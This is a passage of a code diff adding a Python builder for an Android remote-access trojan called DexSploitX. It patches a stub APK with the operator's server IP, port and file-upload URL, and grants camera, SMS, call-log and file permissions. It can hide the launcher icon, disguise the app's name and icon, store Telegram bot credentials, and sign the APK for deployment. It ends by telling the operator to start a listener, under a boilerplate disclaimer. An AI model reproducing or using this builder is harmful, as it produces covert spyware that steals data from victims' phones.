+            'MANAGE_EXTERNAL_STORAGE': ('android.permission.MANAGE_EXTERNAL_STORAGE', 'Manage all files (opens settings)'),
+        }
+        
+        selected_permissions = []
+        
+        for key, (perm, desc) in available_permissions.items():
+            choice = input(f"{Colors.CYAN}  [{desc}]{Colors.END} (y/n, default: y): ").strip().lower()
+            if choice != 'n':
+                selected_permissions.append(perm)
+        
+        self.config['permissions'] = selected_permissions
+        
+        print(f"\n{Colors.GREEN}[✓] {len(selected_permissions)} permissions selected{Colors.END}")
+        print(f"{Colors.GREEN}[✓] Configuration complete{Colors.END}\n")
+        return True
+    
+    def modify_server_config(self):
+        """Modify all smali files with IP and Port configuration"""
+        print(f"{Colors.CYAN}[*] Configuring server settings...{Colors.END}", end='', flush=True)
+        
+        # 1. Update ServerConfig.smali
+        config_file = self.work_dir / "smali/com/system/DroidX/ServerConfig.smali"
+        
+        if config_file.exists():
+            with open(config_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            content = re.sub(
+                r'(\.field public static final SERVER_IP:Ljava/lang/String; = )"[^"]*"',
+                rf'\1"{self.config["ip"]}"',
+                content
+            )
+            
+            content = re.sub(
+                r'(\.field public static final SERVER_PORT:Ljava/lang/String; = )"[^"]*"',
+                rf'\1"{self.config["port"]}"',
+                content
+            )
+            
+            content = re.sub(
+                r'(const-string v\d+, )"4444"',
+                rf'\1"{self.config["port"]}"',
+                content
+            )
+            
+            with open(config_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+        
+        # 2. Update ConnectionService.smali
+        connection_file = self.work_dir / "smali/com/system/DroidX/ConnectionService.smali"
+        
+        if connection_file.exists():
+            with open(connection_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            content = re.sub(
+                r'(const-string v\d+, )"[\d\.]+"(\s+invoke-virtual \{[^}]+\}, Ljava/lang/String;->trim)',
+                rf'\1"{self.config["ip"]}"\2',
+                content
+            )
+            
+            content = re.sub(
+                r'(const-string v\d+, )"4444"(\s+invoke-static \{[^}]+\}, Ljava/lang/Integer;->parseInt)',
+                rf'\1"{self.config["port"]}"\2',
+                content
+            )
+            
+            with open(connection_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+        
+        # 3. Update UploadService.smali
+        upload_file = self.work_dir / "smali/com/system/DroidX/utils/UploadService.smali"
+        
+        if upload_file.exists():
+            with open(upload_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            upload_port = str(int(self.config["port"]) + 1) if self.config["port"].isdigit() else "8081"
+            
+            content = re.sub(
+                r'(const-string v\d+, )"http://[\d\.]+:\d+/upload"',
+                rf'\1"http://{self.config["ip"]}:{upload_port}/upload"',
+                content
+            )
+            
+            with open(upload_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+        
+        print(f"\r{Colors.GREEN}[✓] Server configured{Colors.END}" + " " * 30)
+        return True
+    
+    def modify_manifest(self):
+        """Modify AndroidManifest.xml"""
+        print(f"{Colors.CYAN}[*] Updating manifest...{Colors.END}", end='', flush=True)
+        
+        manifest_file = self.work_dir / "AndroidManifest.xml"
+        
+        with open(manifest_file, 'r') as f:
+            content = f.read()
+        
+        content = re.sub(
+            r'android:label="[^"]*"',
+            f'android:label="{self.config["app_name"]}"',
+            content,
+            count=1
+        )
+        
+        content = re.sub(
+            r'package="[^"]*"',
+            f'package="{self.config["package"]}"',
+            content
+        )
+        
+        if self.config.get('hide_app', False):
+            content = re.sub(
+                r'<category android:name="android\.intent\.category\.LAUNCHER"/>',
+                '<category android:name="android.intent.category.INFO"/>',
+                content
+            )
+        
+        with open(manifest_file, 'w') as f:
+            f.write(content)
+        
+        print(f"\r{Colors.GREEN}[✓] Manifest updated{Colors.END}" + " " * 30)
+        return True
+    
+    def modify_permissions(self):
+        """Modify permissions in PermissionHelper.smali and AndroidManifest.xml"""
+        # 1. Update PermissionHelper.smali
+        permission_helper = self.work_dir / "smali/com/system/DroidX/utils/PermissionHelper.smali"
+        
+        if permission_helper.exists():
+            with open(permission_helper, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            clinit_match = re.search(r'\.method static constructor <clinit>\(\)V.*?\.end method', content, re.DOTALL)
+            
+            if clinit_match:
+                original_clinit = clinit_match.group(0)
+                original_perms = re.findall(r'const-string v\d+, "(android\.permission\.[^"]+)"', original_clinit)
+                filtered_perms = [p for p in original_perms if p in self.config['permissions']]
+                
+                if not filtered_perms:
+                    filtered_perms = self.config['permissions']
+                
+                num_perms = len(filtered_perms)
+                
+                new_clinit = "    .method static constructor <clinit>()V\n"
+                new_clinit += "    .locals 3\n\n"
+                new_clinit += f"    const/16 v0, 0x{num_perms:x}\n\n"
+                new_clinit += "    .line 22\n"
+                new_clinit += "    new-array v0, v0, [Ljava/lang/String;\n\n"
+                
+                for idx, perm in enumerate(filtered_perms):
+                    if idx <= 7:
+                        new_clinit += f"    const/4 v1, 0x{idx:x}\n\n"
+                    else:
+                        new_clinit += f"    const/16 v1, 0x{idx:x}\n\n"
+                    
+                    new_clinit += f"    const-string v2, \"{perm}\"\n\n"
+                    new_clinit += "    aput-object v2, v0, v1\n\n"
+                
+                new_clinit += "    sput-object v0, Lcom/system/DroidX/utils/PermissionHelper;->REQUIRED_PERMISSIONS:[Ljava/lang/String;\n\n"
+                new_clinit += "    return-void\n"
+                new_clinit += ".end method"
+                
+                content = re.sub(
+                    r'\.method static constructor <clinit>\(\)V.*?\.end method',
+                    new_clinit,
+                    content,
+                    flags=re.DOTALL
+                )
+                
+                with open(permission_helper, 'w', encoding='utf-8') as f:
+                    f.write(content)
+        
+        # 2. Update AndroidManifest.xml
+        manifest_file = self.work_dir / "AndroidManifest.xml"
+        
+        if manifest_file.exists():
+            with open(manifest_file, 'r', encoding='utf-8') as f:
+                lines = f.readlines()
+            
+            new_lines = []
+            
+            core_permissions = [
+                'android.permission.INTERNET',
+                'android.permission.ACCESS_NETWORK_STATE',
+                'android.permission.ACCESS_WIFI_STATE',
+                'android.permission.POST_NOTIFICATIONS',
+                'android.permission.FOREGROUND_SERVICE',
+                'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
+                'android.permission.FOREGROUND_SERVICE_CAMERA',
+                'android.permission.FOREGROUND_SERVICE_SPECIAL_USE',
+                'android.permission.FOREGROUND_SERVICE_MICROPHONE',
+                'android.permission.WAKE_LOCK',
+                'android.permission.VIBRATE',
+                'android.permission.RECEIVE_BOOT_COMPLETED',
+                'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
+            ]
+            
+            for line in lines:
+                if '<uses-permission' in line:
+                    match = re.search(r'android:name="([^"]+)"', line)
+                    if match:
+                        perm_name = match.group(1)
+                        if perm_name in core_permissions or perm_name in self.config['permissions']:
+                            new_lines.append(line)
+                    else:
+                        new_lines.append(line)
+                
+                elif '<uses-feature' in line or '<permission ' in line:
+                    if 'android.hardware.camera' in line:
+                        if 'android.permission.CAMERA' in self.config['permissions']:
+                            new_lines.append(line)
+                    elif 'android.hardware.telephony' in line:
+                        if any(p in self.config['permissions'] for p in ['android.permission.READ_PHONE_STATE', 'android.permission.READ_CALL_LOG', 'android.permission.READ_SMS']):
+                            new_lines.append(line)
+                    else:
+                        new_lines.append(line)
+                
+                else:
+                    new_lines.append(line)
+            
+            with open(manifest_file, 'w', encoding='utf-8') as f:
+                f.writelines(new_lines)
+        
+        return True
+    
+    def modify_strings(self):
+        """Modify strings.xml"""
+        strings_file = self.work_dir / "res/values/strings.xml"
+        
+        if strings_file.exists():
+            with open(strings_file, 'r') as f:
+                content = f.read()
+            
+            content = re.sub(
+                r'<string name="app_name">[^<]*</string>',
+                f'<string name="app_name">{self.config["app_name"]}</string>',
+                content
+            )
+            
+            with open(strings_file, 'w') as f:
+                f.write(content)
+        
+        return True
+    
+    def clean_icon_conflicts(self):
+        """Remove all .webp icon files and adaptive icon XML to avoid conflicts"""
+        try:
+            densities = ['mdpi', 'hdpi', 'xhdpi', 'xxhdpi', 'xxxhdpi']
+            
+            for density in densities:
+                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
+                if mipmap_dir.exists():
+                    for webp_file in mipmap_dir.glob("*.webp"):
+                        webp_file.unlink()
+            
+            anydpi_dir = self.work_dir / "res/mipmap-anydpi-v26"
+            if anydpi_dir.exists():
+                for xml_file in anydpi_dir.glob("*.xml"):
+                    xml_file.unlink()
+            
+            return True
+            
+        except Exception as e:
+            return False
+    
+    def change_icon(self):
+        """Change app icon"""
+        if not self.config.get('icon'):
+            return True
+        
+        if not PIL_AVAILABLE:
+            return True
+        
+        try:
+            icon_sizes = {
+                'mdpi': 48,
+                'hdpi': 72,
+                'xhdpi': 96,
+                'xxhdpi': 144,
+                'xxxhdpi': 192
+            }
+            
+            original_icon = Image.open(self.config['icon'])
+            
+            if original_icon.mode != 'RGBA':
+                original_icon = original_icon.convert('RGBA')
+            
+            for density, size in icon_sizes.items():
+                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
+                
+                if mipmap_dir.exists():
+                    for icon_file in mipmap_dir.glob("ic_launcher*.png"):
+                        icon_file.unlink()
+                    
+                    resized_icon = original_icon.resize((size, size), Image.Resampling.LANCZOS)
+                    
+                    icon_file = mipmap_dir / "ic_launcher.png"
+                    resized_icon.save(icon_file, 'PNG')
+                    
+                    round_icon_file = mipmap_dir / "ic_launcher_round.png"
+                    resized_icon.save(round_icon_file, 'PNG')
+            
+            return True
+            
+        except Exception as e:
+            return True
+    
+    def modify_mainactivity(self):
+        """Modify MainActivity.smali to update website"""
+        mainactivity_file = self.work_dir / "smali/com/system/DroidX/MainActivity.smali"
+        
+        if mainactivity_file.exists():
+            with open(mainactivity_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            content = re.sub(
+                r'(\.field private static final OFFICIAL_WEBSITE:Ljava/lang/String; = )"[^"]*"',
+                rf'\1"{self.config["website"]}"',
+                content
+            )
+            
+            content = re.sub(
+                r'(const-string v\d+, )"[^"]*"(\s+invoke-virtual \{[^}]+\}, Landroid/webkit/WebView;->loadUrl)',
+                rf'\1"{self.config["website"]}"\2',
+                content
+            )
+            
+            with open(mainactivity_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+        
+        return True
+    
+    def update_config_json(self):
+        """Update config.json with Telegram credentials"""
+        if not self.config.get('telegram_bot_token'):
+            return True
+        
+        print(f"{Colors.CYAN}[*] Updating config.json...{Colors.END}", end='', flush=True)
+        
+        try:
+            config_data = {
+                "telegram_bot_token": self.config.get('telegram_bot_token', ''),
+                "telegram_chat_id": self.config.get('telegram_chat_id', '')
+            }
+            
+            # Create config.json in parent directory (same level as DexSploitX.py)
+            with open(self.config_json_path, 'w', encoding='utf-8') as f:
+                json.dump(config_data, f, indent=4)
+            
+            print(f"\r{Colors.GREEN}[✓] config.json updated{Colors.END}" + " " * 30)
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.YELLOW}[!] Failed to update config.json: {e}{Colors.END}")
+            return True  # Don't fail the build
+    
+    def rebuild_apk(self):
+        """Rebuild APK using apktool"""
+        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}                  BUILDING APK                             {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
+        
+        output_apk = self.base_dir / "output.apk"
+        
+        # Remove old output
+        if output_apk.exists():
+            output_apk.unlink()
+        
+        cmd = [
+            'java', '-jar', str(self.apktool_jar),
+            'b', str(self.work_dir),
+            '-o', str(output_apk)
+        ]
+        
+        print(f"{Colors.YELLOW}[*] Building APK...{Colors.END}")
+        
+        try:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                print(f"{Colors.GREEN}[✓] APK built successfully{Colors.END}")
+                return output_apk
+            else:
+                print(f"{Colors.RED}[✗] Build failed:{Colors.END}")
+                print(result.stderr)
+                return None
+        except Exception as e:
+            print(f"{Colors.RED}[✗] Build error: {e}{Colors.END}")
+            return None
+    
+    def sign_apk(self, unsigned_apk):
+        """Sign APK with keystore using apksigner"""
+        print(f"\n{Colors.CYAN}[*] Signing APK...{Colors.END}")
+        
+        # Keystore credentials
+        KEYSTORE_PASSWORD = '12345678'
+        KEY_ALIAS = 'key0'
+        KEY_PASSWORD = '12345678'
+        
+        # Create keystore if doesn't exist
+        if not self.keystore_path.exists():
+            print(f"{Colors.YELLOW}[*] Creating keystore...{Colors.END}")
+            self.keystore_path.parent.mkdir(parents=True, exist_ok=True)
+            
+            cmd = [
+                'keytool', '-genkey', '-v',
+                '-keystore', str(self.keystore_path),
+                '-alias', KEY_ALIAS,
+                '-keyalg', 'RSA',
+                '-keysize', '2048',
+                '-validity', '10000',
+                '-storepass', KEYSTORE_PASSWORD,
+                '-keypass', KEY_PASSWORD,
+                '-dname', 'CN=System, OU=IT, O=System, L=City, S=State, C=US'
+            ]
+            
+            subprocess.run(cmd, capture_output=True)
+            print(f"{Colors.GREEN}[✓] Keystore created{Colors.END}")
+        
+        # Output signed APK
+        signed_apk = self.base_dir / "signed.apk"
+        if signed_apk.exists():
+            signed_apk.unlink()
+        
+        # Try apksigner first (modern Android tool)
+        try:
+            # Check if apksigner is available
+            apksigner_cmd = self.find_apksigner()
+            
+            if apksigner_cmd:
+                print(f"{Colors.CYAN}[*] Using apksigner...{Colors.END}")
+                cmd = [
+                    apksigner_cmd, 'sign',
+                    '--ks', str(self.keystore_path),
+                    '--ks-key-alias', KEY_ALIAS,
+                    '--ks-pass', f'pass:{KEYSTORE_PASSWORD}',
+                    '--key-pass', f'pass:{KEY_PASSWORD}',
+                    '--out', str(signed_apk),
+                    str(unsigned_apk)
+                ]
+                
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                
+                if result.returncode == 0:
+                    print(f"{Colors.GREEN}[✓] APK signed with apksigner{Colors.END}")
+                    return signed_apk
+                else:
+                    print(f"{Colors.YELLOW}[!] apksigner failed, trying jarsigner...{Colors.END}")
+                    raise Exception("apksigner failed")
+            else:
+                raise Exception("apksigner not found")
+                
+        except Exception as e:
+            # Fallback to jarsigner
+            print(f"{Colors.CYAN}[*] Using jarsigner...{Colors.END}")
+            
+            cmd = [
+                'jarsigner',
+                '-verbose',
+                '-sigalg', 'SHA256withRSA',
+                '-digestalg', 'SHA-256',
+                '-keystore', str(self.keystore_path),
+                '-storepass', KEYSTORE_PASSWORD,
+                '-keypass', KEY_PASSWORD,
+                str(unsigned_apk),
+                KEY_ALIAS
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                # Move to signed.apk
+                shutil.move(str(unsigned_apk), str(signed_apk))
+                
+                # Align APK with zipalign
+                self.align_apk(signed_apk)
+                
+                print(f"{Colors.GREEN}[✓] APK signed with jarsigner{Colors.END}")
+                return signed_apk
+            else:
+                print(f"{Colors.RED}[✗] Signing failed:{Colors.END}")
+                print(result.stderr)
+                return None
+    
+    def find_apksigner(self):
+        """Find apksigner in Android SDK"""
+        # Common locations
+        possible_paths = [
+            Path.home() / "AppData/Local/Android/Sdk/build-tools",
+            Path("C:/Android/Sdk/build-tools"),
+            Path("C:/Program Files/Android/Sdk/build-tools"),
+            Path("C:/Program Files (x86)/Android/Sdk/build-tools"),
+        ]
+        
+        for sdk_path in possible_paths:
+            if sdk_path.exists():
+                # Find latest build-tools version
+                versions = sorted([d for d in sdk_path.iterdir() if d.is_dir()], reverse=True)
+                for version_dir in versions:
+                    apksigner = version_dir / "apksigner.bat"
+                    if apksigner.exists():
+                        return str(apksigner)
+        
+        # Try system PATH
+        try:
+            result = subprocess.run(['apksigner', '--version'], capture_output=True)
+            if result.returncode == 0:
+                return 'apksigner'
+        except:
+            pass
+        
+        return None
+    
+    def align_apk(self, apk_path):
+        """Align APK with zipalign"""
+        try:
+            # Find zipalign
+            zipalign = self.find_zipalign()
+            if not zipalign:
+                print(f"{Colors.YELLOW}[!] zipalign not found, skipping alignment{Colors.END}")
+                return
+            
+            aligned_apk = self.base_dir / "aligned.apk"
+            
+            cmd = [zipalign, '-f', '-v', '4', str(apk_path), str(aligned_apk)]
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                shutil.move(str(aligned_apk), str(apk_path))
+                print(f"{Colors.GREEN}[✓] APK aligned{Colors.END}")
+        except Exception as e:
+            print(f"{Colors.YELLOW}[!] Alignment failed: {e}{Colors.END}")
+    
+    def find_zipalign(self):
+        """Find zipalign in Android SDK"""
+        possible_paths = [
+            Path.home() / "AppData/Local/Android/Sdk/build-tools",
+            Path("C:/Android/Sdk/build-tools"),
+            Path("C:/Program Files/Android/Sdk/build-tools"),
+            Path("C:/Program Files (x86)/Android/Sdk/build-tools"),
+        ]
+        
+        for sdk_path in possible_paths:
+            if sdk_path.exists():
+                versions = sorted([d for d in sdk_path.iterdir() if d.is_dir()], reverse=True)
+                for version_dir in versions:
+                    zipalign = version_dir / "zipalign.exe"
+                    if zipalign.exists():
+                        return str(zipalign)
+        
+        try:
+            result = subprocess.run(['zipalign', '-h'], capture_output=True)
+            if result.returncode == 0 or result.returncode == 1:
+                return 'zipalign'
+        except:
+            pass
+        
+        return None
+    
+    def copy_to_output(self, signed_apk):
+        """Copy final APK to output folder"""
+        print(f"\n{Colors.CYAN}[*] Copying to output folder...{Colors.END}")
+        
+        self.output_dir.mkdir(parents=True, exist_ok=True)
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"DexSploitX_{self.config['app_name'].replace(' ', '_')}_{timestamp}.apk"
+        final_apk = self.output_dir / filename
+        
+        shutil.copy2(signed_apk, final_apk)
+        
+        size_mb = final_apk.stat().st_size / (1024 * 1024)
+        
+        print(f"\n{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.GREEN}                  BUILD COMPLETE                           {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.CYAN}APK:{Colors.END}          {final_apk}")
+        print(f"{Colors.CYAN}Size:{Colors.END}         {size_mb:.2f} MB")
+        print(f"{Colors.CYAN}App Name:{Colors.END}     {self.config['app_name']}")
+        print(f"{Colors.CYAN}Package:{Colors.END}      {self.config['package']}")
+        print(f"{Colors.CYAN}Server:{Colors.END}       {self.config['ip']}:{self.config['port']}")
+        print(f"{Colors.CYAN}Website:{Colors.END}      {self.config['website']}")
+        print(f"{Colors.CYAN}Permissions:{Colors.END}  {len(self.config.get('permissions', []))} selected")
+        print(f"{Colors.CYAN}Hidden:{Colors.END}       {'Yes (no launcher icon)' if self.config.get('hide_app', False) else 'No (visible in launcher)'}")
+        print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] START LISTENER:{Colors.END}")
+        print(f"{Colors.GREEN}    python DexSploitX.py -i {self.config['ip']} -p {self.config['port']}{Colors.END}")
+        print(f"\n{Colors.BOLD}{Colors.RED}[!] DISCLAIMER:{Colors.END}")
+        print(f"{Colors.YELLOW}    This tool is for AUTHORIZED SECURITY TESTING ONLY.{Colors.END}")
+        print(f"{Colors.YELLOW}    Unauthorized access to devices is ILLEGAL.{Colors.END}")
+        print(f"{Colors.YELLOW}    The developer assumes NO responsibility for misuse.{Colors.END}\n")
+        
+        return final_apk
+    
+    def run(self):
+        """Main build process"""
+        self.print_banner()
+        
+        if not self.check_requirements():
+            return
+        
+        if not self.get_config():
+            return
+        
+        # Update config.json with Telegram credentials
+        if not self.update_config_json():
+            return
+        
+        # Create working directory (copy of stub)
+        if not self.create_working_directory():
+            return
+        
+        try:
+            print(f"{Colors.CYAN}[*] Applying configuration...{Colors.END}", end='', flush=True)
+            
+            if not self.modify_server_config():
+                return
+            
+            if not self.modify_manifest():
+                return
+            
+            if not self.modify_strings():
+                return
+            
+            if not self.modify_mainactivity():
+                return
+            
+            if not self.modify_permissions():
+                return
+            
+            print(f"\r{Colors.GREEN}[✓] Configuration applied{Colors.END}" + " " * 30)
+            
+            print(f"{Colors.CYAN}[*] Preparing resources...{Colors.END}", end='', flush=True)
+            
+            if not self.clean_icon_conflicts():
+                return
+            
+            if not self.change_icon():
+                return
+            
+            print(f"\r{Colors.GREEN}[✓] Resources prepared{Colors.END}" + " " * 30)
+            
+            unsigned_apk = self.rebuild_apk()
+            if not unsigned_apk:
+                return
+            
+            signed_apk = self.sign_apk(unsigned_apk)
+            if not signed_apk:
+                return
+            
+            final_apk = self.copy_to_output(signed_apk)
+            
+            print(f"{Colors.GREEN}[✓] Build complete! APK ready to deploy.{Colors.END}\n")
+            
+        finally:
+            # Always cleanup working directory
+            self.cleanup_working_directory()
+
+def main():
+    try:
+        builder = DexSploitXBuilder()
+        builder.run()
+    except KeyboardInterrupt:
+        print(f"\n{Colors.YELLOW}[!] Build cancelled{Colors.END}")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
